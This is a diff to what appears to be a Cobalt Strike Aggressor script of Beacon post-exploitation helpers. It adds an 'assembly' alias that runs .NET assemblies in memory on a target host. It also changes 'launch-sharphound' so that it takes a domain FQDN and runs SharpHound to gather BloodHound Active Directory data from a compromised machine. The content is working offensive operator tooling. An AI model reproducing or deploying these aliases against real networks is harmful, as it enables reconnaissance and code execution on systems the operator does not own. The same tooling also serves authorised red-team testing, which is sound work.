@@ -39,6 +39,8 @@
 #   - adds command 'powershell-clear' for clearing the imported PowerShell script from a Beacon session
 #   - adds command 'syncall' to sync all downloaded files on demand
 #   - adds command 'whoami' for running 'run whoami /user /fo list'
+#   - adds command 'assembly' as an alias for `execute-assembly`
+#
 #   - enhances 'cd' command to make it restore previous path if "cd -" was issued
 #   - enhances 'rm' command to support multiple files/directories removal at once
 #
@@ -867,8 +869,10 @@ popup beacon_bottom {
             
             item "launch-sharphound" {
                 binput($1, "launch-sharphound");
-                foreach $bid ($1) {
-                    fireAlias($1, "launch-sharphound", "");
+                prompt_text("Specify domain name for Sharphound:", "") {
+	                foreach $bid ($1) {
+	                    fireAlias($1, "launch-sharphound", "$1");
+	                }
                 }
             }
             
@@ -1041,7 +1045,7 @@ beacon_command_register(
 beacon_command_register(
     "launch-sharphound",
     "Launches SharpHound assembly with options specified (or '-c All' if none were given).",
-    "Use: launch-sharphound [sharphound-options]\n\nDescription: Launches SharpHound ingestor with options given to this command. If none options were given - will launch with '-c All'");
+    "Use: launch-sharphound <domain.fqdn> [sharphound-options]\n\nDescription: Launches SharpHound ingestor with options given to this command. The first parameter requires to specify domain in FQDN form.");
 
 beacon_command_register(
     "psh",
@@ -1052,6 +1056,11 @@ beacon_command_register(
     "whoami",
     "Alias for 'run whoami'",
     "Use: whoami [options]\n\nDescription: Runs 'whoami' with given parameters.");
+
+beacon_command_register(
+    "assembly",
+    "Alias for execute-assembly",
+    "Use: assembly </path/to/file.exe|filename> [arguments]\n\nExecutes a local .NET process assembly on target. This command loads the CLR in a temporary\nprocess and loads the assembly into it. If the specified assembly's name is not found, \nwill try to look for it in a preconfigured directory, in a similar fashion  variable works.");
 
 beacon_command_register(
     "powershell-clear",
@@ -1163,6 +1172,19 @@ alias whoami {
 
 alias powershell-clear {
     bpowershell_import_clear($1);
+}
+
+alias assembly {
+	$params = "";
+
+    if(strlen($0) > strlen("assembly ")) {
+        $params = substr($0, strlen("assembly "));
+    }
+    else {
+    	return;
+    }
+
+	fireAlias($1, "execute-assembly", $params);
 }
 
 alias ipconfig {
@@ -1670,13 +1692,23 @@ alias launch-rubeus {
 
 alias launch-sharphound {
     local('$params');
-    $params = "-c All";
+    $params = "";
+    $domain = $2;
 
-    if(strlen($0) > strlen("launch-sharphound ")) {
-        $params = substr($0, strlen("launch-sharphound "));
+    if(strlen($domain) == 0) {
+    	berror($1, "You need to specify domain name before launching SharpHound!\nUse: launch-sharphound <domain> [options]");
+    	return;
     }
 
-    bexecute_assembly($1, $SHARPHOUND_PATH, $params);
+    $pos = strlen("launch-sharphound ") + strlen($domain) + 1;
+    if(strlen($0) > $pos) {
+        $params = substr($0, $pos);
+    }
+
+    $params = $params . " -d $domain";
+
+    btask($1, "Tasked beacon to collect BloodHound data: SharpHound.exe $params");
+    bexecute_assembly!($1, $SHARPHOUND_PATH, [$params trim]);
 }
 
 alias launch-monologue {
